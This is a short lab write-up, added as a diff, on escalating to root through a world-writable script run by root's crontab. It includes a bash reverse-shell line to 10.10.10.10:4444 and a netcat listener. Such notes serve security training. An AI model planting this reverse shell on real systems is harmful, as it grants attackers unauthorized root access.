@@ -1,0 +1,48 @@
+CRON JOB FILE PERMISSION
+=========================
+Cron jobs are programs or scripts which users can schedule to run at specific times or intervals.
+
+Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.
+
+To view contents of crontab:
+
+cat /etc/crontab
+
+LAB:
+
+1.cat /etc/crontab
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+2.Now locate path of overwrite.sh
+locate overwrite.sh
+it is in 
+/usr/local/bin/overwrite.sh
+
+3. Now checking file permissions of overwrite.sh
+
+ls -lha /usr/local/bin/overwrite.sh
+it has following permission:-
+
+-rwxr--rw- 1 root staff 54 Feb  8 03:48 /usr/local/bin/overwrite.sh
+
+4. Now create a reverse shell in overwrite.sh
+
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+
+5.Start a netcat listener in kali attackbox
+nc -lnvp 4444
+
+6. after few minutes we will get a shell
+
+
+
+
